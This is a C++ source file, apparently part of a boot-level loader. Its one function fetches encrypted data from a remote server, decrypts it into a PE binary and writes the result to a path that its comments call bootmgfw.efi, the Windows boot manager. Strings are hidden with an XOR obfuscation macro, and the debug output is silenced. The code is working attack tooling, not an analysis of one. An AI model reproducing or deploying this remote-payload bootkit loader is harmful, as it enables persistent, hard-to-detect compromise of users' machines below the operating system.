#include <windows.h>
#include <iostream>
#include <fstream>
#include <filesystem>

#include <nlohmann/json.hpp>
#include <openssl/evp.h>

#include "cryptography.h"
#include "request.h"

#include "xorstr.h"

namespace fs = std::filesystem;
using json = nlohmann::json;

void loadBoot(const std::string& host, const std::string& port, const std::wstring& outputPath) {
    try {
       // std::cout << "[INFO ->] connecting to server\n";
        std::string rawResponse = sendRequestWithWinsock(host, port, "/get-array");

        if (rawResponse.empty()) {
            throw std::runtime_error(adsq("Failed to retrieve data."));
        }

        json responseJson = json::parse(rawResponse);
        std::string encryptedData = responseJson["data"];

        //std::cout << "[DEBUG] Encrypted data length: " << encryptedData.length() << std::endl;
        //std::cout << "[DEBUG] First 100 chars of encrypted data: " << encryptedData.substr(0, 100) << std::endl;

        std::string decryptedString = decrypt(encryptedData);

        //std::cout << "[DEBUG] Decrypted data length: " << decryptedString.length() << std::endl;
        //std::cout << "[DEBUG] First 100 chars of decrypted data: " << decryptedString.substr(0, 100) << std::endl;

        if (decryptedString.substr(0, 22) != adsq("unsigned char rawData[")) {
            throw std::runtime_error(adsq("Decrypted data does not have the expected format."));

        }

        std::vector<unsigned char> bootmgfwData = parseByteArray(decryptedString);

        if (bootmgfwData.empty()) {
            throw std::runtime_error(adsq("Failed to extract data."));

        }

        //std::cout << "[INFO ->] Extracted " << bootmgfwData.size() << " bytes\n";

        //std::cout << "[DEBUG] First 32 bytes of extracted data:\n";
        //for (size_t i = 0; i < min(bootmgfwData.size(), size_t(32)); ++i) {
        //    std::cout << std::hex << std::setw(2) << std::setfill('0') << static_cast<int>(bootmgfwData[i]) << " ";
        //    if ((i + 1) % 16 == 0) std::cout << "\n";
        //}
        //std::cout << std::dec << "\n";

        if (bootmgfwData.size() >= 2 && bootmgfwData[0] == 0x4D && bootmgfwData[1] == 0x5A) {
            //std::cout << "[DEBUG] MZ header found in extracted data\n";
        }
        else {
            std::cout << adsq("[DEBUG] MZ header not found in extracted data\n");
        }

        std::ofstream outFile(outputPath, std::ios::binary | std::ios::trunc);
        if (!outFile) {
            throw std::runtime_error(adsq("Failed to open file for writing: ") + std::string(outputPath.begin(), outputPath.end()));
        }
        outFile.write(reinterpret_cast<const char*>(bootmgfwData.data()), bootmgfwData.size());
        outFile.close();

        if (!outFile.good()) {
            std::cerr << adsq("[DEBUG] Failed to write file") << std::endl;
        }

        //std::cout << "[INFO ->] bootmgfw.efi written to: " << std::string(outputPath.begin(), outputPath.end()) << "\n";

        std::ifstream checkFile(outputPath, std::ios::binary);
        if (checkFile) {
            std::vector<unsigned char> fileContent((std::istreambuf_iterator<char>(checkFile)), std::istreambuf_iterator<char>());
            //std::cout << "[DEBUG] Written file size: " << fileContent.size() << " bytes\n";
            //std::cout << "[DEBUG] First 32 bytes of written file:\n";
            //for (size_t i = 0; i < min(fileContent.size(), size_t(32)); ++i) {
            //    std::cout << std::hex << std::setw(2) << std::setfill('0') << static_cast<int>(fileContent[i]) << " ";
            //    if ((i + 1) % 16 == 0) std::cout << "\n";
            //}
            //std::cout << std::dec << "\n";

            if (fileContent.size() >= 2 && fileContent[0] == 0x4D && fileContent[1] == 0x5A) {
               // std::cout << "[DEBUG] MZ header found in written file\n";
            }
            else {
                std::cout << adsq("[DEBUG] MZ header not found in written file\n");
            }

            if (fileContent.size() != bootmgfwData.size()) {
                std::cerr << adsq("[WARNING] File size mismatch!\n");
            }
        }
        else {
            std::cerr << adsq("[ERROR] Failed to verify written file\n");
        }
    }
    catch (const std::exception& ex) {
        std::cerr << adsq("[ERROR] exception caught: ") << ex.what() << "\n";
    }
}

